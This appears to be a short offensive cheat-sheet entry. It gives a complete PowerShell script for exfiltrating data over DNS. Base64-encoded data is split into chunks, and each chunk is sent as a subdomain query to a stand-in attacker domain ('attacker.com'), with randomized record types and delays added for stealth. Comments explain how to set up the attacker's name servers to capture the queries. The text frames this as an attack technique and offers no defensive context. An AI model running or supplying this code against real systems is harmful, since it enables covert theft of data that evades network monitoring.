# Send Data via DNS

For stealthier ways, it's a good idea to split the data you send and to randomize query types for each packet.  
Here is the PowerShell command to do that:

```powershell
# 1. Set our domain. (replace the "attacker.com" with own domain)
# Note: We must control "attacker.com" and configure its NS records to point to our own DNS server, such as "ns.attacker.com". This allows us to capture and inspect queries for subdomains like data.attacker.com.
$attackerDomain = "attacker.com"

# 1. Prepare a Base64 encoded data to send
$encodedData = "0123...DEF=="

# 2. Split the data
$chunkSize = 40
$chunks = ($encodedData -split "(.{1,$chunkSize})" | Where-Object { $_ -ne "" })

# 3. Randomize query types
function Get-RandomQueryType {
    $types = @("CNAME", "MX", "TXT")
    return Get-Random -InputObject $types
}

# 4. Perform DNS queries
$counter = 0
foreach ($chunk in $chunks) {
    $fqdn = "$counter-$chunk.$attackerDomain"
    $qtype = Get-RandomQueryType
    
    try {
        Resolve-DnsName -Name $fqdn -Type $qtype | Out-Null
    } catch {}

    $counter++
    Start-Sleep -Seconds 1
}
```

